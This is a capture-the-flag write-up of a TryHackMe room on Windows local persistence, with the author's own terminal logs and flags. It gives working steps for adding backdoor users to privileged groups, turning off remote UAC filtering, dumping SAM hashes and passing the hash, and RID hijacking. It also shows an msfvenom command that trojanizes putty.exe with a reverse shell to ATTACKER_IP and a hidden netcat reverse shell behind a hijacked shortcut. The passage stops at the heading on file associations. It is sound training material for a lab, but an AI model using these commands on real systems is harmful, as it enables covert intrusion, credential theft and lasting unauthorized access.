---
Learn the most common persistence techniques used on Windows machines.
---

# Windows Local Persistence — Writeup

## Overview
### Windows Local Persistence — Writeup
### Windows Local Persistence — Writeup
![](https://tryhackme-images.s3.amazonaws.com/room-icons/1bbcdf49f7e65fbb807dfa9e44a85b88.png)
### Introduction
After gaining the first foothold on your target's internal network, you'll want to ensure you don't lose access to it before actually getting to the crown jewels. Establishing persistence is one of the first tasks we'll have as attackers when gaining access to a network. In simple terms, persistence refers to creating alternate ways to regain access to a host without going through the exploitation phase all over again.
There are many reasons why you'd want to establish persistence as quick as possible, including:
Re-exploitation isn't always possible: Some unstable exploits might kill the vulnerable process during exploitation, getting you a single shot at some of them.
Gaining a foothold is hard to reproduce: For example, if you used a phishing campaign to get your first access, repeating it to regain access to a host is simply too much work. Your second campaign might also not be as effective, leaving you with no access to the network.
The blue team is after you: Any vulnerability used to gain your first access might be patched if your actions get detected. You are in a race against the clock!
While you could do with keeping some administrator's password hash and reusing it to connect back, you always risk those credentials getting rotated at some point. Plus, there are sneakier ways in which you could regain access to a compromised machine, making life harder for the blue team.
In this room, we'll look at the most common techniques attackers use to establish persistence in Windows systems. Before going into this room, it is recommended to be familiar with Windows systems fundamentals. You can check rooms on the matter in the following links:
Windows Fundamentals 1
Windows Fundamentals 2
Powershell is also used extensively throughout this room. You can learn more about it in the Hacking with Powershell room.
### Tampering With Unprivileged Accounts
Having an administrator's credential would be the easiest way to achieve persistence in a machine. However, to make it harder for the blue team to detect us, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.
Click the Start Machine button on this task before continuing. The machine will be available on your web browser, but if you prefer connecting via RDP, you can use the following credentials:
Username 	Administrator
Password 	Password321
Note: When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing Reconnect.
Notice that we assume you have already gained administrative access somehow and are trying to establish persistence from there.
Assign Group Memberships
For this part of the task, we will assume you have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.
The direct way to make an unprivileged user gain administrative privileges is to make it part of the Administrators group. We can easily achieve this with the following command:
```text
ommand Prompt
```
```text
C:\> net localgroup administrators thmuser0 /add
```
This will allow you to access the server by using RDP, WinRM or any other remote administration service available.
If this looks too suspicious, you can use the Backup Operators group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially.
To do so, we begin by adding the account to the Backup Operators group:
```text
Command Prompt
```
```text
C:\> net localgroup "Backup Operators" thmuser1 /add
```
Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups. We'll use WinRM for this task:
```text
Command Prompt
```
```text
C:\> net localgroup "Remote Management Users" thmuser1 /add
```
We'll assume we have already dumped the credentials on the server and have thmuser1's password. Let's connect via WinRM using its credentials:
Username 	thmuser1
Password 	Password321
If you tried to connect right now from your attacker machine, you'd be surprised to see that even if you are on the Backups Operators group, you wouldn't be able to access all files as expected. A quick check on our assigned groups would indicate that we are a part of Backup Operators, but the group is disabled:
```text
AttackBox

user@AttackBox$ evil-winrm -i 10.10.6.15 -u thmuser1 -p Password321

*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```
This is due to User Account Control (UAC). One of the features implemented by UAC, LocalAccountTokenFilterPolicy, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session (Read more on UAC here), if you are using WinRM, you are confined to a limited access token with no administrative privileges.
To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
```text
Command Prompt
```
```text
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```
Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user:
```text
AttackBox

user@AttackBox$ evil-winrm -i 10.10.6.15 -u thmuser1 -p Password321
        
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```
We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:
```text
AttackBox

*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```
Note: If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.
With those files, we can dump the password hashes for all users using secretsdump.py or other similar tools:
```text
AttackBox

user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::
thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::
[*] Cleaning up...
```
And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
```text
AttackBox

user@AttackBox$ evil-winrm -i 10.10.6.15 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```
Using the Administrator console gained through the thmuser1, execute C:\flags\flag1.exe to retrieve your flag.
Special Privileges and Security Descriptors
A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. Privileges are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system. A complete list of available privileges can be found here for reference.
In the case of the Backup Operators group, it has the following two privileges assigned by default:
SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.
We can assign such privileges to any user, independent of their group memberships. To do so, we can use the secedit command. First, we will export the current configuration to a temporary file:
```text
secedit /export /cfg config.inf
```
We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:
We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:
```text
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```
You should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect. Think of a security descriptor as an ACL but applied to other system facilities.
To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this):
```text
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```
This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:
Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.
Notice that for this user to work with the given privileges fully, you'd have to change the LocalAccountTokenFilterPolicy registry key, but we've done this already to get the previous flag.
If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!
```text
Command Prompt
```
```text
C:\> net user thmuser2
User name                    thmuser2

Local Group Memberships      *Users
Global Group memberships     *None
```
Once again, we'll assume we have already dumped the credentials on the server and have thmuser2's password. Let's connect with its credentials using WinRM:
Username 	thmuser2
Password 	Password321
We can log in with those credentials to obtain the flag.
Log in to the machine via WinRM using thmuser2 and execute C:\flags\flag2.exe to retrieve your flag.
RID Hijacking
Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.
When a user is created, an identifier called Relative ID (RID) is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.
In any Windows system, the default Administrator account is assigned the RID = 500, and regular users usually have RID >= 1000.
To find the assigned RIDs for any user, you can use the following command:
```text
Command Prompt
```
```text
C:\> wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
```
The RID is the last bit of the SID (1010 for thmuser3 and 500 for Administrator). The SID is an identifier that allows the operating system to identify a user across a domain, but we won't mind too much about the rest of it for this task.
Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available in C:\tools\pstools in your machine:
```text
Command Prompt

C:\tools\pstools> PsExec64.exe -i -s regedit
```
From Regedit, we will go to HKLM\SAM\SAM\Domains\Account\Users\ where there will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called F, which holds the user's effective RID at position 0x30:
Notice the RID is stored using little-endian notation, so its bytes appear reversed.
We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):
The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.
For this task, we assume you have already compromised the system and obtained the password for thmuser3. For your convenience, the user can connect via RDP with the following credentials:
Username 	thmuser3
Password 	Password321
If you did everything correctly, you should be logged in to the Administrator's desktop.
Note: When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing Reconnect.
Log in to the machine via RDP using thmuser3 and execute C:\flags\flag3.exe to retrieve your flag.
```text
C:\Users\Administrator>net localgroup administrators thmuser0 /add
The command completed successfully.

C:\Users\Administrator>net localgroup "Backup Operators" thmuser1 /add
The command completed successfully.

C:\Users\Administrator>net localgroup "Remote Management Users" thmuser1 /add
The command completed successfully.

C:\Users\Administrator>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
The operation completed successfully.
```
```text
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.6.15 -u thmuser1 -p Password321

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                               

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                 

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\thmuser1\Documents> reg save hklm\system system.bak
The operation completed successfully.

*Evil-WinRM* PS C:\Users\thmuser1\Documents> reg save hklm\sam sam.bak
The operation completed successfully.

*Evil-WinRM* PS C:\Users\thmuser1\Documents> download system.bak
Info: Downloading system.bak to ./system.bak

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\thmuser1\Documents> download sam.bak
Info: Downloading sam.bak to ./sam.bak

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\thmuser1\Documents> 

Warning: Press "y" to exit, press any other key to continue

Info: Exiting...
```
```text
┌──(kali㉿kali)-[~]
└─$
```
```text
┌──(kali㉿kali)-[~]
└─$
```
```text
┌──(kali㉿kali)-[~]
└─$ ls
armitage-tmp  Documents        liv0ff.ps1          PowerLessShell   system.bak
book.txt      Downloads        live0fftheland.dll  Public           Templates
clinic.lst    ftp_flag.txt     multi_launcher      sam.bak          thm.hta
crunch.txt    hashctf2         Music               sandox_learning  usernames-list.txt
Desktop       IDS_IPS_evasion  payload.hta         snmpcheck        Videos
dict2.lst     index.raw        Pictures            stager2.bat
dict.lst      launcher.bat     powercat            Sublist3r
```
```text
┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
thmuser1:1008:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser2:1009:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser3:1010:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
[*] Cleaning up...
```
```text
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.6.15 -u Administrator -H f3118544a831e728781d780cfdb9c1fa

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                               

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                 

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\
*Evil-WinRM* PS C:\> cd flags
*Evil-WinRM* PS C:\flags> .\flag1.exe
THM{FLAG_BACKED_UP!}
```
Insert flag1 here
```text
C:\Users\Administrator>secedit /export /cfg config.inf

The task has completed successfully.
See log %windir%\security\logs\scesrv.log for detail info.

C:\Users\Administrator>secedit /import /cfg config.inf /db config.sdb

C:\Users\Administrator>secedit /configure /db config.sdb /cfg config.inf

The task has completed successfully.
See log %windir%\security\logs\scesrv.log for detail info.

C:\Users\Administrator>net user thmuser2
User name                    thmuser2
Full Name                    thmuser2
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/28/2022 11:48:03 PM
Password expires             Never
Password changeable          5/28/2022 11:48:03 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.

config add thmuser2 in SeBackupPrivilege and SeRestorePrivilege
```
```text
┌──(kali㉿kali)-[~] 
└─$ evil-winrm -i 10.10.6.15 -u thmuser2 -H f3118544a831e728781d780cfdb9c1fa     

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                               

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                 

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\thmuser2\Documents> cd C:\flags
*Evil-WinRM* PS C:\flags> .\flag2.exe
THM{IM_JUST_A_NORMAL_USER}

pheww after a long time 
use these commands in C:\flags\
secedit /export /cfg config.inf
....
```
![[Pasted image 20220911123118.png]]
Insert flag2 here
```text
C:\flags>wmic useraccount get name,sid                                                                                  Name                SID                                                                                                 Administrator       S-1-5-21-1966530601-3185510712-10604624-500                                                         DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503                                                         Guest               S-1-5-21-1966530601-3185510712-10604624-501                                                         thmuser0            S-1-5-21-1966530601-3185510712-10604624-1011                                                        thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008                                                        thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009                                                        thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010                                                        thmuser4            S-1-5-21-1966530601-3185510712-10604624-1013                                                        WDAGUtilityAccount  S-1-5-21-1966530601-3185510712-10604624-504                                                                                                                                                                                                                                                                                                         C:\flags>PsExec64.exe -i -s regedit                                                                                     'PsExec64.exe' is not recognized as an internal or external command,                                                    operable program or batch file.                                                                                                                                                                                                                 C:\flags>cd C:\tools\pstools                                                                                                                                                                                                                    C:\tools\pstools>PsExec64.exe -i -s regedit                                                                                                                                                                                                     PsExec v2.34 - Execute processes remotely                                                                               Copyright (C) 2001-2021 Mark Russinovich                                                                                Sysinternals - www.sysinternals.com                                                                                                                                                                                                                                                                                                                                     regedit exited on WPERSISTENCE with error code 0.                                                                                                                                                                                               C:\tools\pstools>cd C:\flags (2)                                                                                                                                                                                                                   C:\flags>.\flag3.exe                                                                                                    THM{TRUST_ME_IM_AN_ADMIN}
```
```text
┌──(kali㉿kali)-[~/IDS_IPS_evasion]
└─$ xfreerdp /u:thmuser3 /p:'Password321' /v:10.10.6.15 /size:85%  (1)
```
Insert flag3 here
### Backdooring Files
Another method of establishing persistence consists of tampering with some files we know the user interacts with regularly. By performing some modifications to such files, we can plant backdoors that will get executed whenever the user accesses them. Since we don't want to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.
While there are many opportunities to plant backdoors, we will check the most commonly used ones.
Executable Files
If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to C:\Program Files\PuTTY\putty.exe. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.
You can easily plant a payload of your preference in any .exe file with msfvenom. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:

## Exploitation
```text
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```
The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. While this method is good enough to establish persistence, let's look at other sneakier techniques.
Shortcut Files
If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.
For this task, let's check the shortcut to calc on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:
Before hijacking the shortcut's target, let's create a simple Powershell script in C:\Windows\System32 or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:
```text
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```
Finally, we'll change the shortcut to point to our script. Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run our script on a hidden window, for which we'll add the -windowstyle hidden option to Powershell. The final target of the shortcut would be:
![[Pasted image 20220911144421.png]]
Let's start an nc listener to receive our reverse shell on our attacker's machine:
```text
AttackBox

user@AttackBox$ nc -lvp 4445
```
If you double-click the shortcut, you should get a connection back to your attacker's machine. Meanwhile, the user will get a calculator just as expected by them. You will probably notice a command prompt flashing up and disappearing immediately on your screen. A regular user might not mind too much about that, hopefully.
THM flagExecute C:\flags\flag5.exe from your reverse shell to get your flag!
Hijacking File Associations
